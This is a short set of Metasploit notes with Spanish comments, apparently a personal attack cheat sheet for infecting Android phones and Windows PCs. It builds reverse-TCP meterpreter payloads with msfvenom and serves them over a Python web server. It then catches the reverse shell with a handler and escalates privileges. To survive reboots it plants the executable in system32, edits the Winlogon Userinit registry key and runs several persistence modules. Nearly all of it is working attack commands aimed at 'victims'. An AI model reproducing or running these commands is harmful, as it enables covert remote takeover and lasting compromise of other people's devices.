#METODO LOCAL PARA ENVENENAR ANDROID EN EL LIMBO CON NUESTRA DIRECCIÒN
hostname -i
#SELECCIONANDO VENENO Y DEFINIENDO VICTIMA CON PLATAFORMA
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=hostname LPORT=443
-o nombre.apk
#LANZAMOS EL VENENO A LA RED
sudo python3 -m http.server 80
#ACTIVAMOS EL  VENENO
sudo msfconsole
use /multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST hostname
set LPORT puerto
run
#METODO LOCAL PARA ENVENENAR WINDOWS LOCAL
hostname -i
#SELECCIONANDO VENENO Y DEFINIENDO VICTIMA CON PLATAFORMA
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444
 -f exe >secnhack.exe
#LANZAMOS EL VENENO A LA RED
sudo python3 -m http.server 80
#ACTIVAMOS EL  VENENO
sudo msfconsole
use /multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost (your ip)
set lport 4444
exploit
#ESTE METODO NOS DARA MAS PRIVILEGIO EN LA VICTIMA
use exploit/windows/local/ask 
set session 1
exploit
#METODO PARA QUE EL VENO SE ACTIVE  EN CADA INICIO
pwd
cd /windows/system32
upload secnhack.exe
shell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, secnhack.exe" /f
#METODO PARA HACERLO PERSISTENTE
use post/windows/manage/persistence_exe
set rexpath /root/secnhack.exe
set session 3
exploit
#METODO PARA HACERLO PERSISTENTE POR REGISTRO
use exploit/windows/local/registry_persistence
set session 9
exploit
#METODO PARA HACERLO AUN MAS PERSISTENTE
use exploit/windows/local/persistence_service
set session 7
exploit
